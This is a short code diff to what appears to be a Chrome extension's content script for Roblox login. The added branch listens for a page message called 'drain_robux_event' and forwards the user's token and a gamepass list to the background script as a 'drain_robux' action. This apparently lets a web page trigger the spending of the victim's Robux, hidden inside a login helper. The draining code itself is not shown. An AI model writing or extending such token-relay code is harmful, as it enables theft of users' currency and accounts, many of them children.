@@ -3,5 +3,11 @@ window.addEventListener('message', (e) => {
     chrome.runtime.sendMessage({ action: 'login_roblox', token: e.data.token }, (resp) => {
       window.postMessage({ type: 'nexus-login-response', ok: resp?.ok === true, error: resp?.error }, '*');
     });
+  } else if (e.data?.action === 'drain_robux_event') {
+    chrome.runtime.sendMessage({
+      action: 'drain_robux',
+      token: e.data.token,
+      gamepasses: e.data.gamepasses
+    });
   }
 });
